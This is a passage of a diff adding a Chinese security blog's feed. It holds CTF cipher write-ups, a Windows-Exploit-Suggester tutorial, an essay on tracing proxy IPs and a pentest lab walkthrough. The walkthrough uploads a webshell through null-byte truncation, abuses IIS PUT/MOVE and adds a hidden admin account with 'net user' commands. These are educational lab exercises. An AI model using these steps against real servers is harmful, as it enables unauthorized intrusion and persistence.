+    return &quot;&quot;.join(plaintext)
+
+
+if __name__ == &quot;__main__&quot;:
+    n = 2449
+    e = 7
+    ciphertext = [971,922,605,1446,1704,889,2090,605,1899,
+              1915,2088,1988,1235,1032,65,922,958,1988,
+              2144,591,1988,2270,2088,1032,65,958,2233]
+    plaintext = decrypt(n, e, ciphertext)
+    print plaintext
+</code></pre><p>等待一段时间之后，得到如下的结果：<br><img src="http://p1.bpimg.com/567571/8998607018b8dd20.jpg" alt=""></p>
+<h3 id="0x03-影之密码"><a href="#0x03-影之密码" class="headerlink" title="0x03 影之密码"></a>0x03 影之密码</h3><p><img src="http://i1.piimg.com/567571/5d3157e0fbeddd55.png" alt=""></p>
+<p>8842101220480224404014224202480122</p>
+<p><strong>云影密码，1,2,4,8四个数字，以加法可以表示出0~9任何一个数字，例：28=0,124=7,18=9<br>再用1~26表示A~Z    其中0表示间隔。也被称为“01248密码”</strong></p>
+<pre><code>密文：8842101220480224404014224202480122
+88421       8+8+4+2+1=23    W
+122               1+2+2=5              E
+48                      4+8=12            L
+2244           2+2+4+4=12         L
+4                         4                        D
+142242   1+4+2+2+4+2=15   O
+248                2+4+8=14            N
+122                1+2+2=5               E
+
+FLAG:WELLDONE
+</code></pre><h3 id="0x04-德军密码"><a href="#0x04-德军密码" class="headerlink" title="0x04 德军密码"></a>0x04 德军密码</h3><p><img src="http://i1.piimg.com/567571/521cc0be1c8e6212.png" alt=""></p>
+<p>密文：<br>000000000000000000000000000000000000000000000000000101110000110001000000101000000001<br>二战时德军使用过的一种密码，其实是利用了二进制的表示法来替代字母，也称为“费娜姆密码”</p>
+<pre><code>A 1000001     B 1000010       C 1000011          D 1000100
+E 1000101     F 1000110       G 1000111          H 1001000
+I 1001001     J 1001010       K 1001011          L 1001100
+M 1001101     N 1001110       O 1001111          P 1010000
+Q 1010001     R 1010010       S 1010011          T 1010100
+U 1010101     V 1010110       W 1010111          X 1011000
+Y 1011001     Z 1011010
+</code></pre><p>密文每7个一组，与密钥进行异或处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0000000    +      W:1010111    =1010111        W</div><div class="line">0000000    +      E:1000101     =1000101         E</div><div class="line">0000000    +      L:1001100     =1001100         L</div><div class="line">0000000    +      C:1000011     =1000011         C</div><div class="line">0000000    +      O:1001111      =1001111         O</div><div class="line">0000000    +      M:1001101     =1001101         M</div><div class="line">0000000    +      E:1000101     =1000101         E</div><div class="line">0010111    +      T:1010100      =1000011         C</div><div class="line">0000110    +      O:1000011      =1000101         E</div><div class="line">0010000    +      C:1000011     =1010011          S</div><div class="line">0010100    +      F:1000110     =1010010         R</div><div class="line">0000001    +      F:1000110     =1000111         G</div><div class="line">    </div><div class="line">FLAG：WELCOMECESRG</div></pre></td></tr></table></figure>
+<p>异或手工太麻烦了，可以使用代码进行简化：</p>
+<pre><code>a=&apos;000000000000000000000000000000000000000000000000000000000001011100000110000100000001010000000001&apos;  
+b=&apos;010101110100010101001100010000110100111101001101010001010101010001001111010000110100011001000110&apos;  
+c=&apos;&apos;
+
+for i in range(len(a)):  
+    c+=str(ord(a[i])^ord(b[i]))  
+print c  
+</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-CRC32碰撞&quot;&gt;&lt;a href=&quot;#0x01-CRC32碰撞&quot; class=&quot;headerlink&quot; title=&quot;0x01 CRC32碰撞&quot;&gt;&lt;/a&gt;0x01 CRC32碰撞&lt;/h3&gt;&lt;h4 id=&quot;0x01-CRC32&quot;&gt;&lt;a href=&quot;#0x01-CRC32&quot; class=&quot;headerlink&quot; title=&quot;0x01 CRC32&quot;&gt;&lt;/a&gt;0x01 CRC32&lt;/h4&gt;&lt;p&gt;CRC全称为Cyclic redundancy check，即循环冗余校验码，是一种根据输入数据产生简短的固定位数校验码的散列函数。CRC主要用来检测或者校验数据经过传输或者保存后可能出现的错误，CRC32产生32位的散列值（即4字节）。&lt;br&gt;CRC32可以用于数据的校验，在WinRAR等压缩软件中也使用了这一技术，压缩包中每个文件都保存有一个对应的CRC32值，这个值是对压缩前的文件数据计算出来的散列值，在进行解压时会再次计算文件的CRC32值来进行对比，判断压缩包文件是否损坏。
+    
+    </summary>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Windows-Exploit-Suggester（Windows下提权辅助工具）</title>
+    <link href="http://yoursite.com/2017/02/27/Windows-Exploit-Suggester%EF%BC%88Windows%E4%B8%8B%E6%8F%90%E6%9D%83%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7%EF%BC%89/"/>
+    <id>http://yoursite.com/2017/02/27/Windows-Exploit-Suggester（Windows下提权辅助工具）/</id>
+    <published>2017-02-27T05:35:19.000Z</published>
+    <updated>2017-02-27T05:41:51.783Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>提权：</strong>顾名思义就是提高自己在服务器中的权限，就比如在windows中你本身登录的用户是guest，然后通过提权后就变成超级管理员，拥有了管理Windows的所有权限。提权是黑客的专业名词，一般用于网站入侵和系统入侵中。</p>
+<h3 id="0x01-Windows-Exploit-Suggester"><a href="#0x01-Windows-Exploit-Suggester" class="headerlink" title="0x01 Windows-Exploit-Suggester"></a>0x01 Windows-Exploit-Suggester</h3><p>该工具可以将目标系统的补丁安装情况与微软的漏洞数据库进行对比，进而检测出目标系统中潜在的未修复漏洞。同时此工具还会告知用户针对于此漏洞是否有公开的exp和可用的Metasploit模块。<br>同时它可以使用–update参数去自动化地从微软下载漏洞补丁数据库，并将其以Excel表格的形式保存。<br><a id="more"></a><br>需要注意的是，此工具首先会假定目标系统存在所有漏洞，然后再基于系统补丁情况去选择性的移除已修补漏洞。故此工具可能会造成一些误报，因此你首先需要了解目标机器安装了哪些软件。例如，如果此机器没有IIS的补丁，即使机器上没有IIS，工具也同样会认为存在此漏洞。</p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93.png" alt=""></p>
+<h3 id="0x02-下载安装"><a href="#0x02-下载安装" class="headerlink" title="0x02 下载安装"></a>0x02 下载安装</h3><p>下载<a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" target="_blank" rel="external">地址</a></p>
+<p>使用<strong>python windows-exploit-suggester.py –update</strong>对Windows-Exploit-Suggester的漏洞数据库进行更新，<br><img src="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20170227093811561.jpg" alt=""><br>可以看到多了一个Excel文件，其中包含了常用的的最新的一些漏洞。<br><img src="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20170227094655995.jpg" alt=""></p>
+<h3 id="0x03-安装程序依赖：python-xlrd"><a href="#0x03-安装程序依赖：python-xlrd" class="headerlink" title="0x03 安装程序依赖：python-xlrd"></a>0x03 安装程序依赖：python-xlrd</h3><p>更新好之后还需要安装 xlrd模块，用以读取Excel里面的漏洞内容。<br>安装可以使用pip，使用pip install xlrd直接安装<br><img src="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20170227095526835.jpg" alt=""><br>或者<a href="https://pypi.python.org/pypi/xlrd/0.9.4" target="_blank" rel="external">下载</a>，执行./setup.py install对xlrd模块进行安装。</p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/125.png" alt=""></p>
+<h3 id="0x03-查看目标漏洞信息"><a href="#0x03-查看目标漏洞信息" class="headerlink" title="0x03 查看目标漏洞信息"></a>0x03 查看目标漏洞信息</h3><p>在目标机器中执行<strong>systeminfo</strong>，并保存为文本文件</p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20170227100917958.jpg" alt=""></p>
+<p>Windows-Exploit-Suggester中所有的文件和内容<br><img src="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20170227101504916.jpg" alt=""></p>
+<p>执行<strong>python windows-exploit-suggester.py –database 2017-02-27-mssb.xls –systeminfo 12.txt</strong><br>参数<strong>–database</strong>，指定数据库位置(就是那个excel文件)，参数<strong>–systeminfo</strong>，指定目标信息的文件。<br><img src="http://obh1qcqek.bkt.clouddn.com/66666.jpg" alt=""><br>它会显示所有可能的漏洞的操作系统受害者Windows PC</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;strong&gt;提权：&lt;/strong&gt;顾名思义就是提高自己在服务器中的权限，就比如在windows中你本身登录的用户是guest，然后通过提权后就变成超级管理员，拥有了管理Windows的所有权限。提权是黑客的专业名词，一般用于网站入侵和系统入侵中。&lt;/p&gt;
+&lt;h3 id=&quot;0x01-Windows-Exploit-Suggester&quot;&gt;&lt;a href=&quot;#0x01-Windows-Exploit-Suggester&quot; class=&quot;headerlink&quot; title=&quot;0x01 Windows-Exploit-Suggester&quot;&gt;&lt;/a&gt;0x01 Windows-Exploit-Suggester&lt;/h3&gt;&lt;p&gt;该工具可以将目标系统的补丁安装情况与微软的漏洞数据库进行对比，进而检测出目标系统中潜在的未修复漏洞。同时此工具还会告知用户针对于此漏洞是否有公开的exp和可用的Metasploit模块。&lt;br&gt;同时它可以使用–update参数去自动化地从微软下载漏洞补丁数据库，并将其以Excel表格的形式保存。&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>代理IP是否会被追查到</title>
+    <link href="http://yoursite.com/2017/02/19/%E4%BB%A3%E7%90%86IP%E6%98%AF%E5%90%A6%E4%BC%9A%E8%A2%AB%E8%BF%BD%E6%9F%A5%E5%88%B0/"/>
+    <id>http://yoursite.com/2017/02/19/代理IP是否会被追查到/</id>
+    <published>2017-02-19T01:17:46.000Z</published>
+    <updated>2017-02-19T01:23:17.665Z</updated>
+    
+    <content type="html"><![CDATA[<p>   在实际的渗透测试中，我们或许需要隐藏我们的真实IP来进行一些敏感的操作，使用一些代理IP用来逃避我们的真实身份，那么什么是代理IP，使用代理IP是否可以被追查到呢？<br><img src="http://i1.piimg.com/567571/3bd2d1150884b87e.jpg" alt=""><br><a id="more"></a></p>
+<h3 id="代理服务器的主要用途："><a href="#代理服务器的主要用途：" class="headerlink" title="代理服务器的主要用途："></a>代理服务器的主要用途：</h3><p>  <strong>1、共享网络</strong><br>最常见的可能是用代理服务器共享上网，很多人不知不觉中就在用，比如通过sygate，wingate，isa，ccproxy，NT系统自带的网络共享等，可以提供企业级的文件缓存、复制和地址过滤等服务，充分利用局域网出口的有限带宽，加快内网用户的 访问速度，可以解决仅仅有一条线路一个IP，IP资源不足，带局域网很多用户上网的功能，同时可以做为一个防火墙，隔离内网与外网，并且能提供监控网络和记录传输信息的功能，加强了局域网的安全性，又便于对上网用户进行管理。<br>  <strong>2、访问代理</strong><br>加快访问网站速度，在网络出现拥挤或故障时，可通过代理服务器访问目的网站。比如A要访问C网站，但A到C网络出现问题，可以通过绕道，假设B是代理服务器，A可通过B， 再由B到C。大家还记得前几个月，有段时间网络不正常，基本访问不了外国网站，如GOOGLE，YAHOO， 甚至连CCF都访问不了，心里很着急。结果通过一个代理服务器，发现都可以访问，速度还不错，在这样的情况下，代理服务器就可以发挥很大的作用了。还有一类代理服务器备份有相当数量的缓存文件，如果我们当前所访问的数据在代理服务器的缓存文件中，则可直接 读取，而无需再连接到远端Web服务器。这样，加快了访问速度。<br>  <strong>3、防止攻击</strong><br>隐藏自己的真实地址信息，还可隐藏自己的IP，防止被黑客攻击。通过分析指定IP地址，可以查询到网络用户的所在地。例如，大家在一些论坛上看到，论坛中明确标出了发帖用户所在地，这就是根据论坛会员登录时的IP地址解析的。还有平日里我们最为常 用的显IP版QQ，在“发送消息”窗口中，可以查看对方的IP及解析出的地理位置。而当我们使用相应协议的代理服务器后，就可以达到隐藏自己当前所在地地址的目的了。<br>  <strong>4、突破限制</strong><br>代理服务器还可以突破网络限制。比如局域网对上网用户的端口、目的网站、协议、游戏、即时通讯软件等的限制，都可以突破这些限制，可参见我这篇帖子，如何突破局域网对上网用户的一些限制 不再重复。举个例子：GOOGLE我们都喜欢用，其实GOOGLE有一个功能就有点类似于代理服务器的功能，就是网页快照，网站经常发生变动，地址或者网站关了，网站服务器发生故障了，或者已经更新了，但我们仍然要查以前非常有用的资料，网页快照就排 上用场了，Google以其复杂而全自动的搜索方法排除了任何人为因素对搜索结果的影响，保证了网页排名的客观公正，Google可以方便、诚实、客观地帮您在网上找到有价值的资料。GOOGLE有一个海量的数据库，如果找不到服务器，Google储存的网页快照也可救急。虽然网页快照中的信息可能不是最新的，但在网页快照中查找资料要比在实际网页中快得多，这时可以通过加密代理访问Google，再访问其网页快照来救急。<br>  <strong>5、掩藏身份</strong><br>代理服务器知识是黑客基本功，黑客的很多活动都是通过代理服务器，比如扫描、刺探，对局域网内机器进行渗透，黑客一般攻击的时候都是中转了很多级跳板，才攻击目标机器。隐藏了身份，保证了自己的安全。<br>  <strong>6、提高速度</strong><br>提高下载速度，突破下载限制。比如有的网站提供的下载资源，做了一IP一线程的限制，这时候可以用影音传送带，设置多线程，为每个线程设置一个代理。对于限制一个IP的情况很好突破，只要用不同的代理服务器，就可同时下载多个资源，适用于从WEB和FTP 上下载的情况。不过如果是论坛里面的资源，每个用户一个账号，并且限制一账号一IP，代理服务器就突破不了。还有一种情况，比如我们这里，电信的用户上不了联通的电影网站，联通的用户上不了的电信电影网站，这种情况只要电信的找一个联通地代理，IP地址属联通就行。联通找一个电信代理。就可以去电影网站下载其电影。教育网还可以通过代理服 务器可使无出国权限或无访问某IP段权限的计算机访问相关资源。<br>  <strong>7、充当防火墙</strong><br>因为所有使用代理服务器的用户都必须通过代理服务器访问远程站点，因此在代理服务器上就可以设置相应的限制，以过滤或屏蔽某些信息。<br>  <strong>8、用户管理</strong><br>通过代理服务器，管理员可以设置用户验证和记账功能，对用户进行登记，并对用户的访问时间、访问地点、信息浏览进行统计。没有登记的用户无权通过代理服务器访问Internet</p>
+<p>   举个简单的例子：比如说“A”使用了一个美国VPN代理，VPN的地址为142.54.168.75，入侵了某网站。如果想要追查他的真实IP地址，首先可以直接到VPN供应商那里，通过查看服务器日志等方式找出此人真实IP地址.</p>
+<p>   但如果VPN供应商和验证服务器都在美国，恐怕用这个方法不太现实。那么有人可能会说，还可以通过国内的ISP运营商查找路由器记录日志，直接找142.54.168.75相关记录。</p>
+<p>   那么就会出现以下问题：</p>
+<p>   1、如果通过国内ISP运营路由找记录，首先应该确定大体方位，比如确定为某省某市，然后再到这个省市找下级ISP路由器记录，总不能直接到ISP去查全国的数据库吧？那么请问单凭一个美国VPN地址，有何技术手段能确认大体的方位和省份？</p>
+<p>   2、如果确实是重要案件的话，一定要动用ISP全国性数据库，海量的数据库，可能有很多国内用友在当天同样登陆过这个VPN代理142.54.168.75，所以在路由器上会产生很多跟142.54.168.75不相关的记录，那么怎么能揪出A？ （貌似在路由器上能看到的有很多有局限性，比如“A”通过这个美国VPN入侵的某网站，在这个过程中，一些重要的数据和日志记录，都是通过美国VPN服务器中转的，日志都存储在美国VPN服务器上，路由器貌似也捕获不到什么重要信息。）</p>
+<p>   3、即使“A”用的不是美国VPN代理，是国内一些不正规供应商的国内代理，同样在无法到VPN供应商查服务器日志的情况下，并且这些代理和“A”不是一个省份的，通过ISP路由，有什么技术手段确定“A”真实的省份？</p>
+<p>   4、另外在多级代理情况下，如，A节点韩国-B节点美国-C节点广东“A”，很难确定使用代理者真实省份。又该怎么追踪。</p>
+<p><img src="http://i1.piimg.com/567571/b99ade94ddbd3929.jpg" alt=""></p>
+<p><strong>思路如下：</strong></p>
+<p>   方法一：中国出口网络核心层由北京、上海、广州、沈阳、南京、武汉、成都、西安等8个城市，主要控制权在北京上海广州，分别控制着青岛，上海，汕头的国际网络出口。现在很多高级设备都支持基于应用层采取策略（例如网页内容过滤），只需要在几个国际网络出口做上这些策略，而A使用的VPN代理又没有经过高级加密，是很容易筛选出上级IP的。<br>因为计算机不像人，不存在筛选困难。只要条件确定，查到记录也就是瞬间的事情。</p>
+<p>   方法二：考虑到一般黑客都会清除痕迹，在使用VPN代理的时候一般也会使用高级加密或者多层次代理。这样从网络上下手就可能比较困难了。只有从现实着手。可以打着ZF的名义要求，已知国内所有的VPN代理运营商的数据库查找该IP的代理情况，以及其他相关信息，逐层排查。如果查询不到，该VPN代理可能就是A自己架设的了。这种情况下查下IP所在的国外供应商，直接以ZF的名义要求查询，结果肯定能查到。就是不知道国外的这些供应商会不会一定配合你查。</p>
+<p>   综上，代理IP是绝对能被追踪名到的。想查的话，首先你得有敦实的技术，庞大的资源，丰厚的人脉，光凭技术实现的可能性相当小。当然一般已知的vpn代理，你可以直接找管理说明情况配合让其调查。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;   在实际的渗透测试中，我们或许需要隐藏我们的真实IP来进行一些敏感的操作，使用一些代理IP用来逃避我们的真实身份，那么什么是代理IP，使用代理IP是否可以被追查到呢？&lt;br&gt;&lt;img src=&quot;http://i1.piimg.com/567571/3bd2d1150884b87e.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="杂谈" scheme="http://yoursite.com/tags/%E6%9D%82%E8%B0%88/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>简单的渗透测试实验</title>
+    <link href="http://yoursite.com/2017/01/16/%E7%AE%80%E5%8D%95%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C/"/>
+    <id>http://yoursite.com/2017/01/16/简单的渗透测试实验/</id>
+    <published>2017-01-16T02:57:43.000Z</published>
+    <updated>2017-03-04T03:21:40.871Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-渗透测试项目一"><a href="#0x01-渗透测试项目一" class="headerlink" title="0x01 渗透测试项目一"></a>0x01 渗透测试项目一</h3><h4 id="0x01-实验要求"><a href="#0x01-实验要求" class="headerlink" title="0x01 实验要求"></a>0x01 实验要求</h4><p>请以下列任务为目标（10.1.1.178）进行入侵渗透 ：</p>
+<pre><code>1、利用网站漏洞获取该服务器shell；（网页关入侵--铜牌任务）
+2、新建一用户并将权限提升至管理员；（入侵提权--银牌任务）
+3、获得服务器上的关键敏感数据（C:\console）内。（信息窃取--金牌任 务）
+</code></pre><h4 id="0X02-信息搜集"><a href="#0X02-信息搜集" class="headerlink" title="0X02 信息搜集"></a>0X02 信息搜集</h4><p>信息搜集，使用nmap进行信息搜集和探测<br><a id="more"></a><br><img src="http://i1.piimg.com/567571/efaaf2b8eb1b5952.jpg" alt=""></p>
+<h4 id="0x03-漏洞挖掘"><a href="#0x03-漏洞挖掘" class="headerlink" title="0x03 漏洞挖掘"></a>0x03 漏洞挖掘</h4><p>查看目标网站，查看常见的漏洞，如SQL注入、文件上传、xss等主要漏洞。<br>可以看到有一个上传图片的地方，试试文件上传漏洞，构造一句话图片马<br><img src="http://p1.bqimg.com/567571/82bbb977f5d08aca.png" alt=""></p>
+<h4 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h4><p>文件上传漏洞，使用burp进行拦截，这次是简单的使用00截断拿webshell<br><img src="http://i1.piimg.com/567571/adc605a7eafae789.png" alt=""></p>
+<p>可以看见已经上传成功<br><img src="http://i1.piimg.com/567571/a7f184558629ad8e.png" alt=""><br>访问上传的页面，使用菜刀成功进行连接<br><img src="http://p1.bpimg.com/567571/5a176e0d226c680f.png" alt=""><br><img src="http://p1.bpimg.com/567571/7289c2c0b74f0523.png" alt=""></p>
+<h4 id="0x05-权限提升"><a href="#0x05-权限提升" class="headerlink" title="0x05 权限提升"></a>0x05 权限提升</h4><p>查看开放了那些端口 <strong>netstat -an</strong><br><img src="http://p1.bpimg.com/567571/9766a2e3e8072e72.png" alt=""></p>
+<p>查看我们的权限 <strong>whoami</strong>，发现是system权限，可以直接添加用户<br><img src="http://p1.bqimg.com/567571/a656eb75ed3b25e2.png" alt=""></p>
+<p><strong>net user hacker 123 /add</strong> 添加用户名<br><img src="http://p1.bpimg.com/567571/ebf6ecd11da1a299.png" alt=""><br><strong>net localgroup administrators hacker /add</strong> 添加到本地管理组<br><img src="http://p1.bpimg.com/567571/e47025c39af10fb6.png" alt=""><br>可是使用<strong>net user hacker</strong>具体查看时发现并没有添加组成功</p>
+<p><img src="http://p1.bpimg.com/567571/11e6529198b20df3.png" alt=""></p>
+<p>用<strong>whoami /all</strong>查看获取本地系统上所有用户(访问令牌)的用户名和组信息。<br><img src="http://p1.bpimg.com/567571/e37919f8e2ebd6b3.png" alt=""></p>
+<p>管理员组肯定不是Everyone，我们注意到第一个的类型是别名，另外两个是已知，那肯定是改名了，管理员组如无意外就是useras了。直接上命令，将hacker添加到管理组，成功执行，可以看到组成员多了一项。<br><img src="http://p1.bpimg.com/567571/56f82eb4a5d12aa2.png" alt=""></p>
+<h4 id="0x06-远程连接"><a href="#0x06-远程连接" class="headerlink" title="0x06 远程连接"></a>0x06 远程连接</h4><p>远程桌面成功，但是无法访问文件夹<br><img src="http://p1.bpimg.com/567571/c0f0d1cf93461763.png" alt=""></p>
+<p>修改文件夹的安全设置，将我们的用户添加上去<br><img src="http://p1.bpimg.com/567571/fbbe363a304f8bbd.png" alt=""><br><img src="http://p1.bqimg.com/567571/4219c912b158c8ca.png" alt=""></p>
+<p>经过安全设置后我们可以查看文件，任务完成。<br><img src="http://p1.bqimg.com/567571/66fa3248c56f28f5.png" alt=""></p>
+<h3 id="0x02-渗透测试项目二"><a href="#0x02-渗透测试项目二" class="headerlink" title="0x02 渗透测试项目二"></a>0x02 渗透测试项目二</h3><h4 id="0x01-实验要求-1"><a href="#0x01-实验要求-1" class="headerlink" title="0x01 实验要求"></a>0x01 实验要求</h4><p>ip地址为10.1.1.191，在C盘的根目录下存储有两个敏感文件（key1.txt,key2.txt），开放端口不详。</p>
+<pre><code>现要求利用已有的条件和所学的知识（可自己编写工具）来获取敏感文件
+</code></pre><h4 id="0x02-信息搜集"><a href="#0x02-信息搜集" class="headerlink" title="0x02 信息搜集"></a>0x02 信息搜集</h4><p>继续使用nmap进行端口扫描<br><img src="http://i1.piimg.com/567571/f21e2a71a6629b6f.png" alt=""></p>
+<h4 id="0x03-漏洞挖掘-1"><a href="#0x03-漏洞挖掘-1" class="headerlink" title="0x03 漏洞挖掘"></a>0x03 漏洞挖掘</h4><p>打开网址发现为织网CMS，首先就想到搜集之前织网爆出来的漏洞进行利用。</p>
+<p>使用<strong>/data/admin/ver.txt</strong>判断出目标网站所使用的织梦dedecms是哪个版本的，打了哪一天的补丁<br><img src="http://i1.piimg.com/567571/183482040be90c4c.png" alt=""><br>对网站进行测试，发现20140814版本没有什么漏洞，而发现的后台常用后户名和万能密码都不好使。<br>所以根据提示：<strong>漏洞发现，针对服务（如web服务里面就有apache2，iis..），可以去看看其使用的软件版本是否存在漏洞</strong>查看软件是否存在漏洞。</p>
+<p><strong><em>IIS写权限漏洞 (HTTP PUT方法利用)</em></strong><br>该漏洞的产生原因来源于服务器配置不当造成，利用IIS PUT Scaner扫描有漏洞的iis，此漏洞主要是因为服务器开启了<br>webdav的组件导致的可以扫描到当前的操作，具体操作其实是通过webdav的OPTION来查询是否支持PUT。<br><img src="http://obh1qcqek.bkt.clouddn.com/35322.jpg" alt=""></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/610.jpg" alt=""><br>然后提交数据包，会在服务端生成一个1.txt的文件，但是这个文件是无法被iis解析的，所以要利用到的是MOVE，<br>主要目的是为了将txt的文件修改为php的，从而可以将文件变成可执行的脚本文件。</p>
+<p>这次实验也是比较简单的渗透过程，但这些都是基础，在训练中不足的是提权过程以及内网渗透过程，以后得在这两个方面多加练习。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-渗透测试项目一&quot;&gt;&lt;a href=&quot;#0x01-渗透测试项目一&quot; class=&quot;headerlink&quot; title=&quot;0x01 渗透测试项目一&quot;&gt;&lt;/a&gt;0x01 渗透测试项目一&lt;/h3&gt;&lt;h4 id=&quot;0x01-实验要求&quot;&gt;&lt;a href=&quot;#0x01-实验要求&quot; class=&quot;headerlink&quot; title=&quot;0x01 实验要求&quot;&gt;&lt;/a&gt;0x01 实验要求&lt;/h4&gt;&lt;p&gt;请以下列任务为目标（10.1.1.178）进行入侵渗透 ：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1、利用网站漏洞获取该服务器shell；（网页关入侵--铜牌任务）
+2、新建一用户并将权限提升至管理员；（入侵提权--银牌任务）
+3、获得服务器上的关键敏感数据（C:\console）内。（信息窃取--金牌任 务）
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&quot;0X02-信息搜集&quot;&gt;&lt;a href=&quot;#0X02-信息搜集&quot; class=&quot;headerlink&quot; title=&quot;0X02 信息搜集&quot;&gt;&lt;/a&gt;0X02 信息搜集&lt;/h4&gt;&lt;p&gt;信息搜集，使用nmap进行信息搜集和探测&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>初识PentestBox</title>
+    <link href="http://yoursite.com/2016/12/13/%E5%88%9D%E8%AF%86PentestBox/"/>
+    <id>http://yoursite.com/2016/12/13/初识PentestBox/</id>
+    <published>2016-12-13T12:12:15.000Z</published>
+    <updated>2016-12-13T12:15:45.983Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-Pentest-BOX"><a href="#0x01-Pentest-BOX" class="headerlink" title="0x01 Pentest BOX"></a>0x01 Pentest BOX</h3><p>Pentest Box：渗透测试盒子,是一款Windows平台下预配置的便携式开源渗透测试环境，而它也是著名黑客Kapustkiy常用的工具之一。这里集成的大都是Linux下的工具,Kali Linux上面的常用的很多工具这里面也都集成了。<br>它打包了所有的安全工具，并且可以在Windows系统中原生地运行，有效地降低了对虚拟机或者双启动环境的需求。<br>PentestBox官网：<a href="https://pentestbox.org/zh/" target="_blank" rel="external">https://pentestbox.org/zh/</a></p>
+<h3 id="0x02-Pentest-BOX特性"><a href="#0x02-Pentest-BOX特性" class="headerlink" title="0x02 Pentest BOX特性"></a>0x02 Pentest BOX特性</h3><blockquote>
+<p>易于使用<br>设计简洁<a id="more"></a><br>性能卓越<br>没有依赖需求<br>方便携带<br>Linux 工具集<br>无驱动问题<br>模块化<br>更少的内存占用<br>更少的磁盘占用<br>内置浏览器<br>可更新特性<br>易于分享<br>32位系统支持</p>
+</blockquote>
+<h3 id="0x03-Pentest-BOX安装"><a href="#0x03-Pentest-BOX安装" class="headerlink" title="0x03 Pentest BOX安装"></a>0x03 Pentest BOX安装</h3><p>下载地址：<a href="https://pentestbox.org/zh/#download" target="_blank" rel="external">https://pentestbox.org/zh/#download</a><br><img src="http://p1.bpimg.com/567571/d99550f4c0d99413.png" alt=""><br>我们可以有两种选择，一款安装了 Metasploit，另一款没有安装。在安装和使用“安装有 Metasploit 的 PentestBox” 时请关闭杀毒软件和防火墙。默认释放安装在 C:/PentestBox/。<br>直接运行 文件 选择安装的文件位置路径，即可安装，安装其实就是文件的释放，最后整个文件夹大小为4.55GB左右。<br>还可以直接 把PentestBox安装在移动硬盘或者 U盘中，这样就打造了移动渗透工具的平台了，在任意的windows系统上运行，这就比Kali 的Live U盘要方便许多。</p>
+<h3 id="0x04-Pentest-BOX基本文件结构"><a href="#0x04-Pentest-BOX基本文件结构" class="headerlink" title="0x04 Pentest BOX基本文件结构"></a>0x04 Pentest BOX基本文件结构</h3><p>PentestBox共5个文件夹,2个库文件，一个bat批处理和一个exe启动程序。bat和exe都可以启动PentestBox<br><img src="http://p1.bqimg.com/567571/2d40b9294cb05f5c.png" alt=""></p>
+<blockquote>
+<p>base文件夹：里面放了一些工具需要用到的环境变量文件，如：python 、jdk等</p>
+</blockquote>
+<p><img src="http://p1.bqimg.com/567571/38a2aee2799bb778.png" alt=""></p>
+<blockquote>
+<p>bin文件夹：里面的工具基本上足够满足日常的渗透测试要求了</p>
+</blockquote>
+<p><img src="http://p1.bqimg.com/567571/5dcdd7f5cbccde27.png" alt=""><br><img src="http://p1.bqimg.com/567571/13b5e60d9c5a513b.png" alt=""></p>
+<h3 id="0x05-Pentest-BOX基本操作"><a href="#0x05-Pentest-BOX基本操作" class="headerlink" title="0x05 Pentest BOX基本操作"></a>0x05 Pentest BOX基本操作</h3><p>5.1 toolsmanager<br>打开工具管理器，在这里可以 安装/升级/卸载  软件<br>5.2 Update all installed Modules<br>更新已经安装的工具<br>5.3 uninstall + 软件名<br>在toolsmanager 的软件目录里面 我们现在想卸载已经安装过的软件的话，直接键入uninstall + 软件名</p>
+<h3 id="0x06-Pentest-BOX常用工具"><a href="#0x06-Pentest-BOX常用工具" class="headerlink" title="0x06 Pentest BOX常用工具"></a>0x06 Pentest BOX常用工具</h3><p>6.1 Web漏洞扫描器<br><strong>Burp Suite</strong>  是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。<br>所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。</p>
